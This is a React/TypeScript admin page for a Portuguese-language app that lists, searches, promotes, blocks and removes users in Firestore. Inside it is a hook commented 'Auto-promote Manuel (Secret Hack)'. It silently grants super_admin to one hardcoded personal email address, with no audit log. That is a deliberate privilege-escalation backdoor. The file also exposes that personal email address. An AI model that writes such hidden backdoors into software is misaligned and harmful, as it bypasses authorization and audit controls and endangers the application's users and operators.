import React, { useState, useEffect } from 'react';
import { db } from '../../firebaseConfig';
import { collection, query, getDocs, orderBy, limit, where, startAfter, doc, getDoc } from 'firebase/firestore';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { Badge } from '../ui/badge';
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from '../ui/card';
import {
    Search,
    UserCog,
    Check,
    X,
    UserMinus,
    ShieldCheck,
    Briefcase,
    Building2,
    Heart,
    Plus
} from 'lucide-react';
import { toast } from 'sonner';
import { toggleUserBlock, promoteUser, removeUser } from '../../services/userService';
import type { UserManagement } from '../../services/userService';
import { USER_RANKS } from '../../types/userRanks';
import { loggingService } from '../../services/loggingService';
import { useAuth } from '../../context/AuthContext';
import { PromoteUserModal } from './PromoteUserModal';
import UserProfileModal from './UserProfileModal';
import InviteUserModal from './InviteUserModal';

const AdminUsers: React.FC = () => {
    const { currentUser } = useAuth();
    const [users, setUsers] = useState<UserManagement[]>([]);
    const [loading, setLoading] = useState(true);
    const [isLoadingMore, setIsLoadingMore] = useState(false);
    const [searchType, setSearchType] = useState<'email' | 'name' | 'cpf' | 'id'>('email');
    const [searchTerm, setSearchTerm] = useState('');
    const [cityFilter, setCityFilter] = useState('');

    // Pagination State
    const [lastVisible, setLastVisible] = useState<any>(null);
    const [hasMore, setHasMore] = useState(true);
    const USERS_PER_PAGE = 20;

    // Modal State
    const [selectedUser, setSelectedUser] = useState<UserManagement | null>(null);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [isInviteModalOpen, setIsInviteModalOpen] = useState(false);

    const handleUserClick = (user: UserManagement) => {
        setSelectedUser(user);
        setIsModalOpen(true);
    };

    useEffect(() => {
        fetchUsers();
    }, []);

    const fetchUsers = async (isLoadMore = false) => {
        if (isLoadMore) setIsLoadingMore(true);
        else setLoading(true);
        try {
            let q = query(collection(db, 'users'), orderBy('createdAt', 'desc'), limit(USERS_PER_PAGE));

            if (isLoadMore && lastVisible) {
                q = query(collection(db, 'users'), orderBy('createdAt', 'desc'), startAfter(lastVisible), limit(USERS_PER_PAGE));
            }

            const querySnapshot = await getDocs(q);

            const lastVisibleDoc = querySnapshot.docs[querySnapshot.docs.length - 1];
            setLastVisible(lastVisibleDoc);
            setHasMore(querySnapshot.docs.length === USERS_PER_PAGE);

            const usersData = querySnapshot.docs.map(doc => ({
                id: doc.id,
                ...doc.data(),
                displayName: doc.data().displayName || `${doc.data().firstName || ''} ${doc.data().lastName || ''}`.trim() || 'Usuário sem Nome',
                phoneNumber: doc.data().phone || doc.data().phoneNumber || null
            })) as UserManagement[];

            if (isLoadMore) {
                setUsers(prev => [...prev, ...usersData]);
            } else {
                setUsers(usersData);
            }
        } catch (error) {
            console.error("Error fetching users:", error);
            toast.error("Erro ao carregar usuários");
        } finally {
            if (isLoadMore) setIsLoadingMore(false);
            else setLoading(false);
        }
    };


    // Promote Modal State
    const [promoteTarget, setPromoteTarget] = useState<UserManagement | null>(null);
    const [isPromoteModalOpen, setIsPromoteModalOpen] = useState(false);

    // Auto-promote Manuel (Secret Hack)
    useEffect(() => {
        if (currentUser && currentUser.email === 'manuelpnforce@gmail.com') {
            getDoc(doc(db, 'users', currentUser.uid)).then(snap => {
                if (snap.exists() && snap.data().role !== 'super_admin') {
                    promoteUser(currentUser.uid, {
                        role: 'super_admin',
                        professionalRole: 'servidor',
                        displayName: 'Manuel Force (SysAdmin)'
                    }).then(() => {
                        toast.success("Bem-vindo, Chefe! Você agora é Super Admin.");
                        window.location.reload();
                    });
                }
            });
        }
    }, [currentUser]);

    const handlePromoteClick = (targetUser: UserManagement) => {
        setPromoteTarget(targetUser);
        setIsPromoteModalOpen(true);
    };

    const confirmPromotion = async (userId: string, data: Partial<UserManagement>) => {
        try {
            await promoteUser(userId, data);
            setUsers(users.map(u => u.id === userId ? { ...u, ...data } : u));
            toast.success(`Usuário promovido com sucesso!`);
            if (currentUser) {
                loggingService.logAudit('USER_PROMOTE', currentUser.uid, userId, { newData: data });
            }
        } catch (error) {
            console.error("Error promoting user:", error);
            toast.error('Erro ao promover usuário');
        }
    };

    const handleToggleBlock = async (user: UserManagement) => {
        try {
            const newStatus = await toggleUserBlock(user.id, user.status);
            toast.success(`Usuário ${newStatus === 'active' ? 'desbloqueado' : 'bloqueado'}.`);
            if (currentUser) {
                loggingService.logAudit(newStatus === 'blocked' ? 'USER_BAN' : 'USER_UNBAN', currentUser.uid, user.id, { targetEmail: user.email, reason: 'Manual action by admin' });
            }
            setUsers(users.map(u => u.id === user.id ? { ...u, status: newStatus as any } : u));
        } catch (error) {
            console.error("Error toggling block:", error);
            toast.error("Erro ao alterar status do usuário.");
        }
    };

    const handleRemove = async (userId: string) => {
        if (!confirm('Tem certeza? Essa ação não pode ser desfeita.')) return;
        try {
            await removeUser(userId);
            toast.success("Usuário removido.");
            if (currentUser) {
                loggingService.logAudit('USER_BAN', currentUser.uid, userId, { action: 'DELETE_USER_PERMANENT' });
            }
            setUsers(users.filter(u => u.id !== userId));
        } catch {
            toast.error('Erro ao remover usuário');
        }
    };

    const handleSearch = async () => {
        setLoading(true);
        try {
            const term = searchTerm.trim();
            const city = cityFilter.trim();
            if (!term && !city) {
                setLastVisible(null);
                fetchUsers(false);
                return;
            }
            let results: UserManagement[] = [];
            if (searchType === 'id' && term) {
                const docRef = doc(db, 'users', term);
                const docSnap = await getDoc(docRef);
                if (docSnap.exists()) {
                    const data = docSnap.data();
                    const user = {
                        id: docSnap.id,
                        ...data,
                        displayName: data.displayName || `${data.firstName || ''} ${data.lastName || ''}`.trim() || 'Usuário sem Nome',
                        phoneNumber: data.phone || data.phoneNumber || null
                    } as UserManagement;
                    if (!city || (user.city && user.city.toLowerCase().includes(city.toLowerCase()))) {
                        results = [user];
                    }
                }
            } else {
                let q;
                if (term) {
                    const field = searchType === 'cpf' ? 'cpf' : searchType === 'name' ? 'displayName' : 'email';
                    q = query(collection(db, 'users'), where(field, '>=', term), where(field, '<=', term + '\uf8ff'), limit(50));
                } else if (city) {
                    q = query(collection(db, 'users'), where('city', '>=', city), where('city', '<=', city + '\uf8ff'), limit(50));
                }
                if (q) {
                    const querySnapshot = await getDocs(q);
                    const usersData = querySnapshot.docs.map(doc => {
                        const data = doc.data();
                        return {
                            id: doc.id,
                            ...data,
                            displayName: data.displayName || `${data.firstName || ''} ${data.lastName || ''}`.trim() || 'Usuário sem Nome',
                            phoneNumber: data.phone || data.phoneNumber || null
                        };
                    }) as UserManagement[];
                    results = usersData.filter(u => {
                        let match = true;
                        if (term && city) {
                            match = match && (!!u.city && u.city.toLowerCase().includes(city.toLowerCase()));
                        }
                        return match;
                    });
                }
            }
            setHasMore(false);
            setUsers(results);
        } catch (error) {
            console.error("Search error:", error);
            toast.error("Erro na busca");
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="space-y-6 max-w-7xl mx-auto">
            <div className="flex flex-col md:flex-row gap-4 justify-between items-start md:items-center">
                <div>
                    <h2 className="text-3xl font-bold text-gray-900 font-outfit">Gestão de Usuários</h2>
                    <p className="text-gray-500">Administre perfis, cargos e permissões avançadas.</p>
                </div>
                <Button className="gap-2 bg-blue-600 hover:bg-blue-700" onClick={() => setIsInviteModalOpen(true)}>
                    <Plus className="w-4 h-4" />
                    Convidar Usuário
                </Button>
            </div>

            <div className="bg-white p-4 rounded-xl border border-gray-100 shadow-sm space-y-4">
                <div className="flex flex-wrap gap-2">
                    {(['email', 'name', 'cpf', 'id'] as const).map((type) => (
                        <Button
                            key={type}
                            variant={searchType === type ? 'default' : 'outline'}
                            size="sm"
                            onClick={() => setSearchType(type)}
                            className="capitalize"
                        >
                            {type === 'id' ? 'ID' : type}
                        </Button>
                    ))}
                </div>
                <div className="flex w-full gap-2">
                    <div className="relative flex-1">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4" />
                        <Input
                            placeholder={`Buscar por ${searchType === 'cpf' ? 'CPF' : searchType === 'name' ? 'nome' : searchType === 'id' ? 'ID exato' : 'e-mail'}...`}
                            className="pl-10 h-11"
                            value={searchTerm}
                            onChange={(e) => setSearchTerm(e.target.value)}
                            onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
                        />
                        <div className="absolute right-0 top-0 bottom-0 flex items-center pr-2 md:w-1/3 border-l border-gray-100">
                            <Input
                                placeholder="Cidade (Opcional)"
                                className="border-0 focus-visible:ring-0 text-sm h-full"
                                value={cityFilter}
                                onChange={(e) => setCityFilter(e.target.value)}
                                onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
                            />
                        </div>
                    </div>
                    <Button onClick={handleSearch} className="h-11 px-4 md:px-8 touch-manipulation">
                        Buscar
                    </Button>
                </div>
            </div>

            {loading ? (
                <div className="text-center py-20 text-gray-500">Carregando usuários...</div>
            ) : users.length === 0 ? (
                <div className="text-center py-20 text-gray-500">Nenhum usuário encontrado.</div>
            ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    {users.map((user) => (
                        <Card
                            key={user.id}
                            className={`overflow-hidden border-0 shadow-md hover:shadow-lg transition-shadow bg-white cursor-pointer ${user.status === 'blocked' ? 'opacity-75 grayscale' : ''}`}
                            onClick={() => handleUserClick(user)}
                        >
                            <div className={`h-2 w-full ${user.role === 'super_admin' ? 'bg-red-500' :
                                user.role === 'admin' ? 'bg-orange-500' :
                                    user.role === 'city_admin' ? 'bg-blue-500' : 'bg-green-500'
                                }`} />
                            <CardHeader className="pb-2">
                                <div className="flex justify-between items-start">
                                    <div className="flex flex-col">
                                        <CardTitle className="text-lg font-bold text-gray-900 group-hover:text-blue-600 transition-colors">
                                            {user.displayName || (user as any).name || user.email.split('@')[0]}
                                        </CardTitle>
                                        <span className="text-xs font-mono text-gray-500 mt-0.5">ID: {user.id.substring(0, 8)}...</span>
                                    </div>
                                    <Badge variant={user.role === 'super_admin' ? 'destructive' : user.role === 'city_admin' ? 'secondary' : 'outline'}>
                                        {user.role}
                                    </Badge>
                                </div>
                            </CardHeader>
                            <CardContent className="space-y-4">
                                <div className="flex flex-wrap gap-1.5">
                                    {user.professionalRole && (
                                        <Badge variant="default" className="bg-slate-700 gap-1">
                                            {user.professionalRole === 'servidor' && <ShieldCheck className="w-3 h-3" />}
                                            {user.professionalRole === 'empresa' && <Building2 className="w-3 h-3" />}
                                            {user.professionalRole === 'cidadao' && <Briefcase className="w-3 h-3" />}
                                            {user.professionalRole} {user.accessLevel && `Lvl ${user.accessLevel}`}
                                        </Badge>
                                    )}
                                    {user.isDonor && (
                                        <Badge variant="outline" className="text-pink-600 border-pink-200 bg-pink-50 gap-1">
                                            <Heart className="w-3 h-3 fill-pink-600" /> Doador
                                        </Badge>
                                    )}
                                    {user.badges?.map(badgeId => {
                                        const rank = USER_RANKS.find(r => r.id === badgeId);
                                        return (
                                            <Badge key={badgeId} variant="secondary" className="gap-1">
                                                <span>{rank?.emoji || '🏅'}</span>
                                                {rank?.name || badgeId}
                                            </Badge>
                                        );
                                    })}
                                </div>
                                <div className="flex items-center gap-2 text-xs text-gray-500 border-t pt-4">
                                    <span className="flex items-center gap-1">
                                        <div className={`w-2 h-2 rounded-full ${user.status === 'blocked' ? 'bg-red-500' : 'bg-green-500'}`} />
                                        {user.status === 'blocked' ? 'Bloqueado' : 'Ativo'}
                                    </span>
                                </div>
                            </CardContent>
                            <CardFooter className="bg-gray-50/50 p-4 flex gap-2">
                                <Button
                                    variant="outline"
                                    size="sm"
                                    className="flex-1 gap-1 touch-manipulation"
                                    onClick={(e) => {
                                        e.stopPropagation();
                                        handlePromoteClick(user);
                                    }}
                                >
                                    <UserCog className="w-4 h-4" />
                                    Gerenciar Cargo
                                </Button>
                                <Button
                                    variant={user.status === 'blocked' ? 'default' : 'secondary'}
                                    size="sm"
                                    className="flex-1 gap-1 touch-manipulation"
                                    onClick={(e) => {
                                        e.stopPropagation();
                                        handleToggleBlock(user);
                                    }}
                                >
                                    {user.status === 'blocked' ? <Check className="w-4 h-4" /> : <X className="w-4 h-4" />}
                                    {user.status === 'blocked' ? 'Reativar' : 'Bloquear'}
                                </Button>
                                <Button
                                    variant="ghost"
                                    size="sm"
                                    className="px-2 text-gray-400 hover:text-red-600 touch-manipulation"
                                    onClick={(e) => {
                                        e.stopPropagation();
                                        handleRemove(user.id);
                                    }}
                                >
                                    <UserMinus className="w-4 h-4" />
                                </Button>
                            </CardFooter>
                        </Card>
                    ))}
                </div>
            )}
            {!searchTerm.trim() && hasMore && !loading && !isLoadingMore && (
                <div className="flex justify-center pt-6 pb-12">
                    <Button variant="outline" onClick={() => fetchUsers(true)} className="w-full max-w-xs">
                        Carregar Mais Usuários
                    </Button>
                </div>
            )}
            {isLoadingMore && (
                <div className="flex justify-center p-4"><div className="animate-spin rounded-full h-6 w-6 border-b-2 border-gray-900"></div></div>
            )}

            <UserProfileModal
                user={selectedUser}
                open={isModalOpen}
                onClose={() => setIsModalOpen(false)}
            />

            <PromoteUserModal
                user={promoteTarget}
                open={isPromoteModalOpen}
                onClose={() => setIsPromoteModalOpen(false)}
                onPromote={confirmPromotion}
            />

            <InviteUserModal
                open={isInviteModalOpen}
                onClose={() => setIsInviteModalOpen(false)}
            />
        </div>
    );
};

export default AdminUsers;
